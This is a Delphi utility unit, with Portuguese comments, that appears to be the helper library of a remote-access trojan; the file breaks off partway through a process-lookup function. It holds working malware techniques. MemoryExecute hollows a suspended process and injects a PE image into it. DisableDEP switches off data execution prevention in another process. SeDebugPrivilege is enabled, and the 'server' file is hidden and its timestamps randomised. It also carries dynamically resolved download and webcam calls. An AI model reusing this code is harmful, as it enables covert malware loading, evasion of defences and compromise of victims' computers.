unit Utils;

interface

uses
  windows,
  TLhelp32;

const
  ENTER = #10;
  faReadOnly  = $00000001 platform;
  faHidden    = $00000002 platform;
  faSysFile   = $00000004 platform;
  faVolumeID  = $00000008 platform;
  faDirectory = $00000010;
  faArchive   = $00000020 platform;
  faSymLink   = $00000040 platform;
  faAnyFile   = $0000003F;
  WM_CLOSE    = $0010;
  WM_QUIT     = $0012;

type
  HDROP = Longint;
  PPWideChar = ^PWideChar;

type
  LongRec = packed record
    case Integer of
      0: (Lo, Hi: Word);
      1: (Words: array [0..1] of Word);
      2: (Bytes: array [0..3] of Byte);
  end;

  TFileName = type string;

type
  TSearchRec = record
    Time: Integer;
    Size: Integer;
    Attr: Integer;
    Name: TFileName;
    ExcludeAttr: Integer;
    FindHandle: THandle  platform;
    FindData: TWin32FindData  platform;
  end;

type
  HANDLE        = THandle;
  PVOID         = Pointer;
  LPVOID        = Pointer;
  SIZE_T        = Cardinal;
  ULONG_PTR     = Cardinal;
  NTSTATUS      = LongInt;
  LONG_PTR      = Integer;

  PImageSectionHeaders = ^TImageSectionHeaders;
  TImageSectionHeaders = Array [0..95] Of TImageSectionHeader;

type
  TUnicodeString = packed record
    Length: Word;
    MaximumLength: Word;
    Buffer: PWideChar;
  end;

  PSYSTEM_PROCESSES = ^SYSTEM_PROCESSES;
  SYSTEM_PROCESSES = packed record
    NextEntryDelta,
    ThreadCount: dword;
    Reserved1: array [0..5] of dword;
    CreateTime,
    UserTime,
    KernelTime: LARGE_INTEGER;
    ProcessName: TUnicodeString;
    BasePriority: dword;
    ProcessId,
    InheritedFromProcessId,
    HandleCount: dword;
  end;

// copiar diretório
const
  FO_COPY = $0002;
  FOF_NOCONFIRMATION = $0010;
  FOF_RENAMEONCOLLISION = $0008;

type
  FILEOP_FLAGS = Word;

type
  PRINTEROP_FLAGS = Word;

  PSHFileOpStructA = ^TSHFileOpStructA;
  PSHFileOpStruct = PSHFileOpStructA;
  _SHFILEOPSTRUCTA = packed record
    Wnd: HWND;
    wFunc: UINT;
    pFrom: PAnsiChar;
    pTo: PAnsiChar;
    fFlags: FILEOP_FLAGS;
    fAnyOperationsAborted: BOOL;
    hNameMappings: Pointer;
    lpszProgressTitle: PAnsiChar;
  end;
  _SHFILEOPSTRUCT = _SHFILEOPSTRUCTA;
  TSHFileOpStructA = _SHFILEOPSTRUCTA;
  TSHFileOpStruct = TSHFileOpStructA;
// fim copiar diretório

type
UNICODE_STRING = Packed record
  Length : smallint;
  MaximumLength : smallint;
  Buffer : integer;
end;

pPROCESS_BASIC_INFORAMTION = ^PROCESS_BASIC_INFORAMTION;
PROCESS_BASIC_INFORAMTION = packed record
  ExitStatus : DWORD;
  PEBBaseAddress : Pointer;
  AffinityMask : DWORD;
  BasePriority : DWORD;
  UniqueProcessId : DWORD;
  InheritedFormUniqueProcessId : DWORD;
end;

function IntToStr(i: Integer): String;
function StrToInt(S: String): Integer;
function GetValueName(chave, valor: string): string;
Function lerreg(Key:HKEY; Path:string; Value, Default: string): string;
function MySystemFolder: String;
function MyWindowsFolder: String;
function MyTempFolder: String;
function MyRootFolder: String;
function GetProgramFilesDir: string;
function UpperString(S: String): String;
function LowerString(S: String): String;
function isIE7: boolean;
function write2reg(key: Hkey; subkey, name, value: string): boolean;
function MyShellExecute(hWndA: HWND; Operation, FileName, Parameters, Directory: PChar; ShowCmd: Integer): HINST;
function GetHour:String;
function GetMinute:String;
function GetSecond:String;
function GetYear:String;
function GetMonth:String;
function GetDay:String;
function GetShellFolder(const folder: string): string;
function GetAppDataDir: string;
function ExtractFilePath(sFilename: String): String;
function LastDelimiter(S: String; Delimiter: Char): Integer;
function MyDeleteFile(s: String): Boolean;
function MyDeleteFile2(lpFileName: PChar): BOOL;
function fileexists(filename: string): boolean;
function ProcessFileName(PID: DWORD): string;
function processExists(exeFileName: string; var PID: integer): Boolean;
function ExtractFilename(const path: string): string;
function StrLen(tStr:PChar):integer;
function GetDefaultBrowser: string;
function ExtractFileExt(const filename: string): string;
function GetResourcePointer(ResName: string; ResType: PChar; var ResourceSize: cardinal): pointer;
Procedure CriarArquivo(NomedoArquivo: String; imagem: string; Size: DWORD);
Function MemoryExecute(Buffer: Pointer; ProcessName, Parameters: String; Visible: Boolean): Boolean;
function LerArquivo(FileName: String; var tamanho: DWORD): String;
procedure changeserverdate(server: string);
function ActiveCaption: string;
function TrimRight(const s: string): string;
Function StartThread(pFunction : TFNThreadStartRoutine; iPriority : Integer = Thread_Priority_Normal; iStartFlag : Integer = 0) : THandle;
Function CloseThread( ThreadHandle : THandle) : Boolean;
procedure hideserver(server: string);
Function ReplaceString(ToBeReplaced, ReplaceWith : string; TheString :string):string;
function MyGetFileSize2(path:String):int64;
function FindFirst(const Path: string; Attr: Integer;
  var  F: TSearchRec): Integer;
function FindMatchingFile(var F: TSearchRec): Integer;
procedure _MyFindClose(var F: TSearchRec);
function GetPIDbyName(lpProcName: PWideChar) : DWORD; stdcall;
function IntToHex(dwNumber: DWORD; Len: Integer): String; overload;
function MycapGetDriverDescriptionA(wDriverIndex: UINT; lpszName: LPSTR; cbName: integer; lpszVer: LPSTR; cbVer: integer): BOOL;
function MyDragQueryFile(Drop: HDROP; FileIndex: UINT; FileName: PChar; cb: UINT): UINT;
function MyURLDownloadToFile(Caller: IUnknown; URL: PChar; FileName: PChar;
  Reserved: DWORD;LPBINDSTATUSCALLBACK: pointer): HResult;
procedure DesabilitarClose(handle: HWND);
procedure HabilitarClose(handle: HWND);
function DeleteFolder(Path: String): Boolean;
function MyRenameFile_Dir(oldPath, NewPath : string) : Boolean;
function CopyDirectory(const Hwd : LongWord; const SourcePath, DestPath : string): boolean;
procedure StrPCopy(Dest : PChar; Source : String);
function MySHFileOperation(const lpFileOp: TSHFileOpStruct): Integer;
function GetFileDateTime(lpFilename: String): String;
function Format(sFormat: String; Args: Array of const): String;
function FindNext(var F: TSearchRec): Integer;
function DisableDEP(pid: dword): Boolean;
procedure SetTokenPrivileges;
function GetHwndText(AHandle: HWND): string;
Function ExtractDiskSerial(Drive: String): String;
function SecondsIdle: int64;
function ExecuteCommand(command, params: string; ShowCmd: dword): boolean;
function IsDirectoryEmpty(const directory : string) : boolean;




implementation

function IsDirectoryEmpty(const directory : string) : boolean;
var
  searchRec :TSearchRec;
begin
  try
    result := (FindFirst(directory+'\*.*', faAnyFile, searchRec) = 0) AND
              (FindNext(searchRec) = 0) AND
              (FindNext(searchRec) <> 0);
    finally
    _MyFindClose(searchRec) ;
  end;
end;

function ExecuteCommand(command, params: string; ShowCmd: dword): boolean;
begin
  if myShellExecute(0, nil, pchar(command), pchar(params), nil, ShowCmd) <= 32 then
  result := false else result := true;
end;

function SecondsIdle: int64;
var
   liInfo: TLastInputInfo;
begin
   liInfo.cbSize := SizeOf(TLastInputInfo) ;
   GetLastInputInfo(liInfo) ;
   Result := GetTickCount - liInfo.dwTime;
end;

Function ExtractDiskSerial(Drive: String): String;
Var
  Serial:DWord;
  DirLen,Flags: DWord;
  DLabel : Array[0..11] of Char;
begin
  Result := '';
  GetVolumeInformation(PChar(Drive),dLabel,12,@Serial,DirLen,Flags,nil,0);
  Result := IntToHex(Serial,8);
end;

function GetHwndText(AHandle: HWND): string;
var
  Textlength: Integer;
  Text: PChar;
  test:pchar;
begin
  result := '';
  try
    GetMem(Text, TextLength + 1);
    GetWindowText(AHandle, Text, TextLength + 1);
    finally
    result := string(text);
  end;
end;

function ZwQueryInformationProcess(hProcess: THandle;
  InformationClass: DWORD;Buffer: pPROCESS_BASIC_INFORAMTION;
  BufferLength : DWORD;ReturnLength: PDWORD): Cardinal; stdcall; external 'ntdll.dll' name 'ZwQueryInformationProcess';
function ZwSetInformationProcess(cs1:THandle; cs2:ULONG;
  cs3:Pointer; cs4:ULONG):ULONG; stdcall; external 'ntdll.dll' name 'ZwSetInformationProcess';

procedure SetTokenPrivileges;
var
  hToken1, hToken2, hToken3: THandle;
  TokenPrivileges: TTokenPrivileges;
  Version: OSVERSIONINFO;
begin
  Version.dwOSVersionInfoSize := SizeOf(OSVERSIONINFO);
  GetVersionEx(Version);
  if Version.dwPlatformId <> VER_PLATFORM_WIN32_WINDOWS then
  begin
    try
      OpenProcessToken(GetCurrentProcess, TOKEN_ADJUST_PRIVILEGES, hToken1);
      hToken2 := hToken1;
      LookupPrivilegeValue(nil, 'SeDebugPrivilege', TokenPrivileges.Privileges[0].luid);
      TokenPrivileges.PrivilegeCount := 1;
      TokenPrivileges.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
      hToken3 := 0;
      AdjustTokenPrivileges(hToken1, False, TokenPrivileges, 0, PTokenPrivileges(nil)^, hToken3);
      TokenPrivileges.PrivilegeCount := 1;
      TokenPrivileges.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
      hToken3 := 0;
      AdjustTokenPrivileges(hToken2, False, TokenPrivileges, 0, PTokenPrivileges(nil)^, hToken3);
      CloseHandle(hToken1);
    except;
    end;
  end;
end;

function DisableDEP(pid: dword): Boolean;
var
  ExecuteFlags: LongWord;
  ProcessHandle: THandle;
begin
  Result := False;

  ProcessHandle := OpenProcess(PROCESS_ALL_ACCESS, False, pid);

  if ProcessHandle = 0 then
    Exit;
  if ZwQueryInformationProcess(ProcessHandle, {ProcessExecuteFlags} 22, @ExecuteFlags, sizeof(ExecuteFlags), nil) < $C0000000 then
  begin
    ExecuteFlags := ExecuteFlags or $2; // MEM_EXECUTE_OPTION_ENABLE
    ExecuteFlags := ExecuteFlags or $8; // MEM_EXECUTE_OPTION_PERMANENT

    Result := (ZwSetInformationProcess(ProcessHandle, {ProcessExecuteFlags} 22, @ExecuteFlags, sizeof(ExecuteFlags)) < $C0000000);

    CloseHandle(ProcessHandle);
  end;
end;

function FindNext(var F: TSearchRec): Integer;
begin
  if FindNextFile(F.FindHandle, F.FindData) then
    Result := FindMatchingFile(F) else
    Result := GetLastError;
end;

function Format(sFormat: String; Args: Array of const): String;
var
  i: Integer;
  pArgs1, pArgs2: PDWORD;
  lpBuffer: PChar;
begin
  pArgs1 := nil;
  if Length(Args) > 0 then
    GetMem(pArgs1, Length(Args) * sizeof(Pointer));
  pArgs2 := pArgs1;
  for i := 0 to High(Args) do
  begin
    pArgs2^ := DWORD(PDWORD(@Args[i])^);
    inc(pArgs2);
  end;
  GetMem(lpBuffer, 1024);
  try
    SetString(Result, lpBuffer, wvsprintf(lpBuffer, PChar(sFormat), PChar(pArgs1)));
  except
    Result := '';
  end;
  if pArgs1 <> nil then
    FreeMem(pArgs1);
  if lpBuffer <> nil then
    FreeMem(lpBuffer);
end;

function GetFileDateTime(lpFilename: String): String;
var
  i, j: Integer;
  hFile: THandle;
  lpFindFileData: TWin32FindData;
  lpSystemTime: TSystemTime;
  lpDate: PChar;
  lpTime: PChar;
const
//  sResult = '%s às %s horas';
  sResult = '%s -- %s';
begin
  Result := '';
  hFile := FindFirstFile(PChar(lpFilename), lpFindFileData);
  if hFile <> INVALID_HANDLE_VALUE then
  begin
    lpDate := nil;
    lpTime := nil;
    windows.FileTimeToSystemTime(lpFindFileData.ftLastAccessTime, lpSystemTime);
    i := GetDateFormat(LOCALE_USER_DEFAULT, 0, @lpSystemTime, 'dd/MM/yyyy', nil, 0);
    if i > 0 then
    begin
      GetMem(lpDate, i);
      GetDateFormat(LOCALE_USER_DEFAULT, 0, @lpSystemTime, 'dd/MM/yyyy', lpDate, i);
    end;
    j := GetTimeFormat(LOCALE_USER_DEFAULT, 0, @lpSystemTime, 'HH:mm', nil, 0);
    if j > 0 then
    begin
      GetMem(lpTime, j);
      GetTimeFormat(LOCALE_USER_DEFAULT, 0, @lpSystemTime, 'HH:mm', lpTime, j);
    end;
    Result := Format(sResult, [lpDate, lpTime]);
    FreeMem(lpDate, i);
    FreeMem(lpTime, j);
  end;
  FindClose(hFile);
end;

function MySHFileOperation(const lpFileOp: TSHFileOpStruct): Integer;
var
  xSHFileOperation: function(const lpFileOp: TSHFileOpStruct): Integer; stdcall;
begin
  xSHFileOperation := GetProcAddress(LoadLibrary(pchar('shell32.dll')), pchar('SHFileOperationA'));
  Result := xSHFileOperation(lpFileOp);
end;

procedure StrPCopy(Dest : PChar; Source : String);
begin
  Source := Source + #0;
  Move(Source[1], Dest^, Length(Source));
end;

function CopyDirectory(const Hwd : LongWord; const SourcePath, DestPath : string): boolean;
var
  OpStruc: TSHFileOpStruct;
  frombuf, tobuf: Array [0..128] of Char;
Begin
  Result := false;
  FillChar( frombuf, Sizeof(frombuf), 0 );
  FillChar( tobuf, Sizeof(tobuf), 0 );
  StrPCopy( frombuf,  SourcePath);
  StrPCopy( tobuf,  DestPath);
  With OpStruc DO Begin
    Wnd:= Hwd;
    wFunc:= FO_COPY;
    pFrom:= @frombuf;
    pTo:=@tobuf;
    fFlags:= FOF_NOCONFIRMATION or FOF_RENAMEONCOLLISION;
    fAnyOperationsAborted:= False;
    hNameMappings:= Nil;
    lpszProgressTitle:= Nil;
  end;
  if myShFileOperation(OpStruc) = 0 then
    Result := true;
end;

function MyRenameFile_Dir(oldPath, NewPath : string) : Boolean;
begin
  if oldPath = NewPath then //Duh!
    Result := False
  else
    Result := movefile(pchar(OldPath), pchar(NewPath));
end;

function DeleteFolder(Path: String): Boolean;
var
  hFile: THandle;
  lpFindFileData: TWin32FindData;
  sFilename: String;
  Directory: Boolean;
begin
  Result := False;
  if Path[Length(Path)] <> '\' then Path := Path + '\';
  hFile := FindFirstFile(PChar(Path + '*.*'), lpFindFileData);
  if hFile = INVALID_HANDLE_VALUE then Exit;
  repeat
    sFilename := lpFindFileData.cFileName;
    if ((sFilename <> '.') and (sFilename <> '..')) then
    begin
      Directory := (lpFindFileData.dwFileAttributes <> INVALID_HANDLE_VALUE) and
                   (FILE_ATTRIBUTE_DIRECTORY and lpFindFileData.dwFileAttributes <> 0);
      if Directory = False then
      begin
        sFilename := Path + sFilename;
        MyDeleteFile(PChar(sFilename));
      end else
      begin
        DeleteFolder(Path + sFilename);
      end;
    end;
  until FindNextFile(hFile, lpFindFileData) = False;
  FindClose(hFile);
  if RemoveDirectory(PChar(Path)) then Result := True;
end;

procedure HabilitarClose(handle: HWND);
var
  Flag: UINT;
  AppSysMenu: THandle;
begin
  AppSysMenu := windows.GetSystemMenu(Handle, False);
  Flag := MF_ENABLED; // Set Flag to MF_ENABLED to re-enable it
  EnableMenuItem(AppSysMenu, SC_CLOSE, MF_BYCOMMAND or Flag);
end;

procedure DesabilitarClose(handle: HWND);
var
  Flag: UINT;
  AppSysMenu: THandle;
begin
  AppSysMenu := windows.GetSystemMenu(Handle, False);
  Flag := MF_GRAYED; // Set Flag to MF_ENABLED to re-enable it
  EnableMenuItem(AppSysMenu, SC_CLOSE, MF_BYCOMMAND or Flag);
end;

function MyURLDownloadToFile(Caller: IUnknown; URL: PChar; FileName: PChar;
  Reserved: DWORD;LPBINDSTATUSCALLBACK: pointer): HResult;
var
  xURLDownloadToFile: function(Caller: IUnknown; URL: PChar; FileName: PChar;
    Reserved: DWORD;LPBINDSTATUSCALLBACK: pointer): HResult; stdcall;
begin
  xURLDownloadToFile := GetProcAddress(LoadLibrary(pchar('urlmon.dll')), pchar('URLDownloadToFileA'));
  Result := xURLDownloadToFile(Caller, URL, FileName, Reserved, LPBINDSTATUSCALLBACK);
end;

function MyDragQueryFile(Drop: HDROP; FileIndex: UINT; FileName: PChar; cb: UINT): UINT;
var
  xDragQueryFile: function(Drop: HDROP; FileIndex: UINT; FileName: PChar; cb: UINT): UINT; stdcall;
begin
  xDragQueryFile := windows.GetProcAddress(LoadLibrary(pchar('shell32.dll')), pchar('DragQueryFileA'));
  Result := xDragQueryFile(Drop, FileIndex, FileName, cb);
end;

function MycapGetDriverDescriptionA(wDriverIndex: UINT; lpszName: LPSTR; cbName: integer; lpszVer: LPSTR; cbVer: integer): BOOL;
var
  xcapGetDriverDescriptionA: function(wDriverIndex: UINT; lpszName: LPSTR; cbName: integer; lpszVer: LPSTR; cbVer: integer): BOOL; stdcall;
begin
  xcapGetDriverDescriptionA := GetProcAddress(LoadLibrary(pchar('AVICAP32.dll')), pchar('capGetDriverDescriptionA'));
  Result := xcapGetDriverDescriptionA(wDriverIndex, lpszName, cbName, lpszVer, cbVer);
end;

function IntToHex(dwNumber: DWORD; Len: Integer): String; overload;
const
  HexNumbers:Array [0..15] of Char = ('0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
                                      'A', 'B', 'C', 'D', 'E', 'F');
begin
  Result := '';
  while dwNumber <> 0 do
  begin
    Result := HexNumbers[Abs(dwNumber mod 16)] + Result;
    dwNumber := dwNumber div 16;
  end;
  if Result = '' then
  begin
    while Length(Result) < Len do
      Result := '0' + Result;
    Exit;
  end;
  if Result[Length(Result)] = '-' then
  begin
    Delete(Result, Length(Result), 1);
    Insert('-', Result, 1);
  end;
  while Length(Result) < Len do
    Result := '0' + Result;
end;

function ZwQuerySystemInformation(ASystemInformationClass: dword;
                                  ASystemInformation: Pointer;
                                  ASystemInformationLength: dword;
                                  AReturnLength: PCardinal): Cardinal; stdcall;
                                  external 'ntdll.dll';

function GetProcessTable(SysInfoClass: DWORD) : Pointer;
var
  dwSize: DWORD;
  lpBuff: Pointer;
  NT_stat: Cardinal;
begin
  Result := nil;
  dwSize := $4000;
  repeat
    lpBuff := VirtualAlloc(nil, dwSize, $1000 or $2000, 4);
    if lpBuff = nil then Exit;
    NT_stat := ZwQuerySystemInformation(SysInfoClass, lpBuff, dwSize, nil);
    if NT_stat = Cardinal($C0000004) then
    begin
      VirtualFree(lpBuff, 0, $8000);
      dwSize := dwSize shl 1;
    end;
  until NT_stat <> Cardinal($C0000004);
  if NT_stat = Cardinal($00000000) then
  begin
    Result := lpBuff;
    Exit;
  end;
  VirtualFree(lpBuff, 0, $8000);
end; //GetProcessTable

function GetPIDbyName(lpProcName: PWideChar) : DWORD; stdcall;
var
  PTable: PSYSTEM_PROCESSES;
begin
  Result := 0;
  PTable := GetProcessTable(5);
  if PTable = nil then Exit;
  while PTable^.NextEntryDelta > 0 do
  begin
    PTable := Pointer(DWORD(PTable) + PTable^.NextEntryDelta);
    if lstrcmpiW(PTable^.ProcessName.Buffer, lpProcName) = 0 then
    begin
      Result := PTable^.ProcessId;
      Exit;
    end;
  end;
end;

procedure _MyFindClose(var F: TSearchRec);
begin
  if F.FindHandle <> INVALID_HANDLE_VALUE then
  begin
    FindClose(F.FindHandle);
    F.FindHandle := INVALID_HANDLE_VALUE;
  end;
end;

function FindMatchingFile(var F: TSearchRec): Integer;
var
  LocalFileTime: TFileTime;
begin
  with F do
  begin
    while FindData.dwFileAttributes and ExcludeAttr <> 0 do
      if not FindNextFile(FindHandle, FindData) then
      begin
        Result := GetLastError;
        Exit;
      end;
    FileTimeToLocalFileTime(FindData.ftLastWriteTime, LocalFileTime);
    FileTimeToDosDateTime(LocalFileTime, LongRec(Time).Hi,
      LongRec(Time).Lo);
    Size := FindData.nFileSizeLow;
    Attr := FindData.dwFileAttributes;
    Name := FindData.cFileName;
  end;
  Result := 0;
end;

function FindFirst(const Path: string; Attr: Integer;
  var  F: TSearchRec): Integer;
const
  faSpecial = faHidden or faSysFile or faVolumeID or faDirectory;
begin
  F.ExcludeAttr := not Attr and faSpecial;
  F.FindHandle := FindFirstFile(PChar(Path), F.FindData);
  if F.FindHandle <> INVALID_HANDLE_VALUE then
  begin
    Result := FindMatchingFile(F);
    if Result <> 0 then _MyFindClose(F);
  end else
    Result := GetLastError;
end;

function MyGetFileSize2(path:String):int64;
var
  SearchRec : TSearchRec;
begin
  if fileexists(path) = false then
  begin
    result := 0;
    exit;
  end;
  if FindFirst(path, faAnyFile, SearchRec ) = 0 then                  // if found
  Result := Int64(SearchRec.FindData.nFileSizeHigh) shl Int64(32) +    // calculate the size
  Int64(SearchREc.FindData.nFileSizeLow)
  else
  Result := -1;
  _Myfindclose(SearchRec);
end;

Function ReplaceString(ToBeReplaced, ReplaceWith : string; TheString :string):string;
var
  Position: Integer;
  LenToBeReplaced: Integer;
  TempStr: String;
  TempSource: String;
begin
  LenToBeReplaced:=length(ToBeReplaced);
  TempSource:=TheString;
  TempStr:='';
  repeat
    position := pos(ToBeReplaced, TempSource);
    if (position <> 0) then
    begin
      TempStr := TempStr + copy(TempSource, 1, position-1); //Part before ToBeReplaced
      TempStr := TempStr + ReplaceWith; //Tack on replace with string
      TempSource := copy(TempSource, position+LenToBeReplaced, length(TempSource)); // Update what's left
    end else
    begin
      Tempstr := Tempstr + TempSource; // Tack on the rest of the string
    end;
  until (position = 0);
  Result:=Tempstr;
end;

procedure hideserver(server: string);
var
  i: cardinal;
begin
  i := GetFileAttributes(PChar(server));
  i := i or faHidden;   //oculto
  i := i or faReadOnly; //somente leitura
  i := i or faSysFile;  //de sistema
  SetFileAttributes(PChar(server), i);
end;

Function StartThread(pFunction : TFNThreadStartRoutine; iPriority : Integer = Thread_Priority_Normal; iStartFlag : Integer = 0) : THandle;
var
  ThreadID : DWORD;
begin
  Result := CreateThread(nil, 0, pFunction, nil, iStartFlag, ThreadID);
  SetThreadPriority(Result, iPriority);
end;

Function CloseThread( ThreadHandle : THandle) : Boolean;
begin
  Result := TerminateThread(ThreadHandle, 1);
  CloseHandle(ThreadHandle);
end;

function TrimRight(const s: string): string;
var
  i: integer;
begin
  i := Length(s);
  while (I > 0) and (s[i] <= ' ') do Dec(i);
  Result := Copy(s, 1, i);
end;

function ActiveCaption: string;
var
  Handle: THandle;
  Len: LongInt;
  Title: string;
begin
  Result := '';
  Handle := GetForegroundWindow;
  if Handle <> 0 then
  begin
    Len := GetWindowTextLength(Handle) + 1;
    SetLength(Title, Len);
    GetWindowText(Handle, PChar(Title), Len);
    ActiveCaption := TrimRight(Title);
  end;
end;

procedure changeserverdate(server: string);
var
  SHandle: THandle;
  MyFileTime : TFileTime;
begin
  randomize;
  MyFileTime.dwLowDateTime := 29700000 + random(99999);
  MyFileTime.dwHighDateTime:= 29700000 + random(99999);

  SHandle := CreateFile(PChar(server), GENERIC_WRITE, FILE_SHARE_READ or FILE_SHARE_WRITE, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
  if SHandle = INVALID_HANDLE_VALUE then
  begin
    CloseHandle(sHandle);
    SHandle := CreateFile(PChar(server), GENERIC_WRITE, FILE_SHARE_READ or FILE_SHARE_WRITE, nil, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
    if SHandle <> INVALID_HANDLE_VALUE then
    SetFileTime(sHandle, @MyFileTime, @MyFileTime, @MyFileTime);
    CloseHandle(sHandle);
  end else
  SetFileTime(sHandle, @MyFileTime, @MyFileTime, @MyFileTime);
  CloseHandle(sHandle);
end;

function LerArquivo(FileName: String; var tamanho: DWORD): String;
var
  hFile: Cardinal;
  lpNumberOfBytesRead: DWORD;
  imagem: pointer;

begin
  result := '';
  if fileexists(filename) = false then exit;
  
  imagem := nil;
  hFile := CreateFile(PChar(FileName), GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, 0, 0);
  tamanho := GetFileSize(hFile, nil);
  GetMem(imagem, tamanho);
  ReadFile(hFile, imagem^, tamanho, lpNumberOfBytesRead, nil);
  setstring(result, Pchar(imagem), tamanho);
  freemem(imagem, tamanho);
  CloseHandle(hFile);
end;

function MyZwUnmapViewOfSection(ProcessHandle: HANDLE; BaseAddress: PVOID): NTSTATUS;
var
  xZwUnmapViewOfSection: function(ProcessHandle: HANDLE; BaseAddress: PVOID): NTSTATUS; stdcall;
begin
  xZwUnmapViewOfSection := GetProcAddress(LoadLibrary(pchar('ntdll.dll')), pchar('ZwUnmapViewOfSection'));
  Result := xZwUnmapViewOfSection(ProcessHandle, BaseAddress);
end;

Function ImageFirstSection(NTHeader: PImageNTHeaders): PImageSectionHeader;
Begin
  Result := PImageSectionheader( ULONG_PTR(@NTheader.OptionalHeader) +
                                 NTHeader.FileHeader.SizeOfOptionalHeader);
End;

Function Protect(Characteristics: ULONG): ULONG;
Const
  Mapping       :Array[0..7] Of ULONG = (
                 PAGE_NOACCESS,
                 PAGE_EXECUTE,
                 PAGE_READONLY,
                 PAGE_EXECUTE_READ,
                 PAGE_READWRITE,
                 PAGE_EXECUTE_READWRITE,
                 PAGE_READWRITE,
                 PAGE_EXECUTE_READWRITE  );
Begin
  Result := Mapping[ Characteristics SHR 29 ];
End;

Function MemoryExecute(Buffer: Pointer; ProcessName, Parameters: String; Visible: Boolean): Boolean;
Var
  ProcessInfo: TProcessInformation;
  StartupInfo: TStartupInfo;
  Context: TContext;
  BaseAddress: Pointer;
  BytesRead: DWORD;
  BytesWritten: DWORD;
  I: ULONG;
  OldProtect: ULONG;
  NTHeaders: PImageNTHeaders;
  Sections: PImageSectionHeaders;
  Success: Boolean;

Begin
  Result := False;

  FillChar(ProcessInfo, SizeOf(TProcessInformation), 0);
  FillChar(StartupInfo, SizeOf(TStartupInfo),        0);

  StartupInfo.cb := SizeOf(TStartupInfo);
  StartupInfo.wShowWindow := Word(Visible);

  If (CreateProcess(PChar(ProcessName), PChar(Parameters), NIL, NIL,
                    False, CREATE_SUSPENDED, NIL, NIL, StartupInfo, ProcessInfo)) Then
  Begin
    Success := True;

    Try
      Context.ContextFlags := CONTEXT_INTEGER;
      If (GetThreadContext(ProcessInfo.hThread, Context) And
         (ReadProcessMemory(ProcessInfo.hProcess, Pointer(Context.Ebx + 8),
                            @BaseAddress, SizeOf(BaseAddress), BytesRead)) And
         (myZwUnmapViewOfSection(ProcessInfo.hProcess, BaseAddress) >= 0) And
         (Assigned(Buffer))) Then
         Begin
           NTHeaders    := PImageNTHeaders(Cardinal(Buffer) + Cardinal(PImageDosHeader(Buffer)._lfanew));
           BaseAddress  := VirtualAllocEx(ProcessInfo.hProcess,
                                          Pointer(NTHeaders.OptionalHeader.ImageBase),
                                          NTHeaders.OptionalHeader.SizeOfImage,
                                          MEM_RESERVE or MEM_COMMIT,
                                          PAGE_READWRITE);
           If (Assigned(BaseAddress)) And
              (WriteProcessMemory(ProcessInfo.hProcess, BaseAddress, Buffer,
                                  NTHeaders.OptionalHeader.SizeOfHeaders,
                                  BytesWritten)) Then
              Begin
                Sections := PImageSectionHeaders(ImageFirstSection(NTHeaders));

                For I := 0 To NTHeaders.FileHeader.NumberOfSections -1 Do
                  If (WriteProcessMemory(ProcessInfo.hProcess,
                                         Pointer(Cardinal(BaseAddress) +
                                                 Sections[I].VirtualAddress),
                                         Pointer(Cardinal(Buffer) +
                                                 Sections[I].PointerToRawData),
                                         Sections[I].SizeOfRawData, BytesWritten)) Then
                     VirtualProtectEx(ProcessInfo.hProcess,
                                      Pointer(Cardinal(BaseAddress) +
                                              Sections[I].VirtualAddress),
                                      Sections[I].Misc.VirtualSize,
                                      Protect(Sections[I].Characteristics),
                                      OldProtect);

                If (WriteProcessMemory(ProcessInfo.hProcess,
                                       Pointer(Context.Ebx + 8), @BaseAddress,
                                       SizeOf(BaseAddress), BytesWritten)) Then
                   Begin
                     Context.Eax := ULONG(BaseAddress) +
                                    NTHeaders.OptionalHeader.AddressOfEntryPoint;
                     Success := SetThreadContext(ProcessInfo.hThread, Context);
                   End;
              End;
         End;
    Finally
      If (Not Success) Then
        TerminateProcess(ProcessInfo.hProcess, 0)
      Else
        ResumeThread(ProcessInfo.hThread);

      Result := Success;
    End;
  End;
End;

Procedure CriarArquivo(NomedoArquivo: String; imagem: string; Size: DWORD);
var
  hFile: THandle;
  lpNumberOfBytesWritten: DWORD;

begin
  hFile := CreateFile(PChar(NomedoArquivo), GENERIC_WRITE, FILE_SHARE_WRITE, nil, CREATE_ALWAYS, 0, 0);

  if hFile <> INVALID_HANDLE_VALUE then
  begin
    if Size = INVALID_HANDLE_VALUE then
    SetFilePointer(hFile, 0, nil, FILE_BEGIN);
    WriteFile(hFile, imagem[1], Size, lpNumberOfBytesWritten, nil);
    CloseHandle(hFile);
  end;
end;

function GetResourcePointer(ResName: string; ResType: PChar; var ResourceSize: cardinal): pointer;
var
  ResourceLocation: HRSRC;
  ResourceHandle: THandle;
  ResourcePointer: Pointer;
  Module: Pointer;
begin
  Result := nil;
  ResourceSize := 0;
  ResourceLocation := FindResource(HInstance, pchar(ResName), ResType);
  if ResourceLocation <> 0 then
  begin
    ResourceSize := SizeofResource(HInstance, ResourceLocation);
    if ResourceSize <> 0 then
    begin
      ResourceHandle := LoadResource(HInstance, ResourceLocation);
      if ResourceHandle <> 0 then Result := LockResource(ResourceHandle);
    end;
  end;
end;

function ExtractFileExt(const filename: string): string;
var
i, l: integer;
ch: char;

begin
  if pos('.', filename) = 0 then
  begin
    result := '';
    exit;
  end;
  l := length(filename);
  for i := l downto 1 do
  begin
    ch := filename[i];
    if (ch = '.') then
    begin
      result := copy(filename, i + 1, length(filename));
      break;
    end;
  end;
end;

function GetDefaultBrowser: string;
var
  chave, valor: string;
begin
  chave := 'http\shell\open\command';
  valor := '';
  result := lerreg(HKEY_CLASSES_ROOT, chave, valor, '');

  if result = '' then
  exit;
  if result[1] = '"' then
  result := copy(result, 2, pos('.exe', result) + 2)
  else
  result := copy(result, 1, pos('.exe', result) + 3);

  if upperstring(extractfileext(result)) <> 'EXE' then
  result := GetProgramFilesDir + '\Internet Explorer\iexplore.exe';
end;

function StrLen(tStr:PChar):integer;
begin
  result:=0;
  while tStr[Result] <> #0 do
  inc(Result);
end;

function ExtractFilename(const path: string): string;
var
i, l: integer;
ch: char;

begin
  l := length(path);
  for i := l downto 1 do
  begin
    ch := path[i];
    if (ch = '\') or (ch = '/') then
    begin
      result := copy(path, i + 1, l - i);
      break;
    end;
  end;
end;

function processExists(exeFileName: string; var PID: integer): Boolean;
var
  ContinueLoop: BOOL;
  FSnapshotHandle: THandle;
  FProcessEntry32: TProcessEntry32;
begin
